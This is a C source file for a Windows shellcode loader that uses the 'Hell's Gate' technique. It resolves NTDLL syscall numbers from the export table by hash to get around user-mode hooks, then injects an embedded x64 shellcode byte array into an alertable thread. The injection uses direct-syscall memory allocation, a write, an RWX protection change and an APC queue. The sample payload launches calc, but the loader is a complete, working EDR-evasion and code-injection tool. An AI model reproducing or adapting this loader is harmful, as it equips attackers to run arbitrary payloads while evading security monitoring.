#include "base.h"

// Hells Gate functions
PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
}

DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x7734773477347734;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;

			// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV RCX, <syscall>
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry->wSystemCall = (high << 8) | low;
					break;
				}

				cw++;
			};
		}
	}

	return TRUE;
}

PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
	char* d = dest;
	const char* s = src;
	if (d < s)
		while (len--)
			*d++ = *s++;
	else {
		char* lasts = s + (len - 1);
		char* lastd = d + (len - 1);
		while (len--)
			*lastd-- = *lasts--;
	}
	return dest;
}

BOOL ApcInjectionViaDirectSyscalls(IN PVX_TABLE pVxTable, IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pShellcode, IN SIZE_T sSize) {

	NTSTATUS STATUS = NULL; 
	BOOL bState = TRUE;

	SIZE_T sAllocatedSize = sizeof(pShellcode); 

	PVOID pAddress = NULL; 
	SIZE_T sBytesWritten = NULL; 
	DWORD dwOldProtection = NULL; 

	// Allocate memory using NtAllocateVirtualMemory
	HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall); 
	STATUS = HellDescent(hProcess, &pAddress, NULL, &sAllocatedSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE); 
	if (STATUS != STATUS_SUCCESS) {
		PRINT_NTERROR("HellDescent [NtAllocateVirtualMemory]"); 
		bState = FALSE;
		goto CLEANUP; 
	}
	OKAY("[ 0x%p ] [RW-] Allocated %d bytes.", pAddress, sAllocatedSize); 

	// Write payload to allocated memory
	HellsGate(pVxTable->NtWriteVirtualMemory.wSystemCall); 
	STATUS = HellDescent(hProcess, pAddress, pShellcode, sSize, &sBytesWritten); 
	if (STATUS != STATUS_SUCCESS) {
		PRINT_ERROR("HellDescent [NtWriteVirtualMemory]"); 
		bState = FALSE;
		goto CLEANUP; 
	}
	OKAY("[ 0x%p ] Wrote %d bytes.", pAddress, sBytesWritten); 

	// Change memory protection
	HellsGate(pVxTable->NtProtectVirtualMemory.wSystemCall); 
	STATUS = HellDescent(hProcess, &pAddress, &sAllocatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection);
	if (STATUS != STATUS_SUCCESS) {
		PRINT_ERROR("HellDescent [NtProtectVirtualMemory]");
		bState = FALSE;
		goto CLEANUP; 
	}
	OKAY("[ 0x%p ] [RWX] Changed memory protection.", pAddress); 

	// Execute APC Thread
	HellsGate(pVxTable->NtQueueApcThread.wSystemCall); 
	STATUS = HellDescent(hThread, pAddress, NULL, NULL, NULL); 
	if (STATUS != STATUS_SUCCESS) {
		PRINT_ERROR("HellDescent [NtQueueApcThread]"); 
		bState = FALSE;
		goto CLEANUP; 
	}
	OKAY("[ 0x%p ] Executed payload using NtQueueApcThread", pAddress); 

CLEANUP: 
	return bState; 
}

VOID Alertable() {
	SleepEx(INFINITE, TRUE);
}

int wmain(int argc, wchar_t* argv[]) {

	// Calculate hashes
	/*printf("#define %s%s 0x%p\n", "NtAllocateVirtualMemory", "_djb2", djb2("NtAllocateVirtualMemory")); 
	printf("#define %s%s 0x%p\n", "NtWriteVirtualMemory", "_djb2", djb2("NtWriteVirtualMemory")); 
	printf("#define %s%s 0x%p\n", "NtProtectVirtualMemory", "_djb2", djb2("NtProtectVirtualMemory")); 
	printf("#define %s%s 0x%p\n", "NtQueueApcThread", "_djb2", djb2("NtQueueApcThread"));
	return EXIT_SUCCESS; */

	// x64 calc payload
	unsigned char pShellcode[] = {
		0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
		0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
		0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
		0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
		0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
		0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
		0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
		0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
		0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
		0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
		0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
		0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
		0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
		0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
		0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
		0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
		0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
		0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
		0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
		0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
		0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
		0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
		0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
	};

	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return EXIT_FAILURE;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return EXIT_FAILURE;

	/// Initialize Table structure 
	VX_TABLE Table = { 0 }; 

	Table.NtAllocateVirtualMemory.dwHash = NtAllocateVirtualMemory_djb2; 
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory)) {
		PRINT_ERROR("GetVxTableEntry [NtAllocateVirtualMemory]"); 
		return EXIT_FAILURE; 
	}

	Table.NtWriteVirtualMemory.dwHash = NtWriteVirtualMemory_djb2;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWriteVirtualMemory)) {
		PRINT_ERROR("GetVxTableEntry [NtWriteVirtualMemory]");
		return EXIT_FAILURE;
	}

	Table.NtProtectVirtualMemory.dwHash = NtProtectVirtualMemory_djb2;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory)) {
		PRINT_ERROR("GetVxTableEntry [NtProtectVirtualMemory]");
		return EXIT_FAILURE;
	}

	Table.NtQueueApcThread.dwHash = NtQueueApcThread_djb2;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtQueueApcThread)) {
		PRINT_ERROR("GetVxTableEntry [NtQueueApcThread]");
		return EXIT_FAILURE;
	}

	/// Injection
	HANDLE hLocalProcess = (HANDLE)-1;
	HANDLE hThread = NULL; 
	DWORD dwThreadId = NULL; 

	// Create thread in alertable state
	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&Alertable, NULL, NULL, &dwThreadId);
	if (!hThread) {
		PRINT_ERROR("CreateThread");
		return EXIT_FAILURE;
	}
	OKAY("[ 0x%p ] Created thread %d.", hThread, dwThreadId);

	INFO("Injecting..."); 
	if (!ApcInjectionViaDirectSyscalls(&Table, hLocalProcess, hThread, pShellcode, sizeof(pShellcode))) {
		PRINT_ERROR("ApcInjectionViaDirectSyscalls"); 
		return EXIT_FAILURE; 
	}
	OKAY("Done."); 
	getchar(); 
	
    return EXIT_SUCCESS; 
}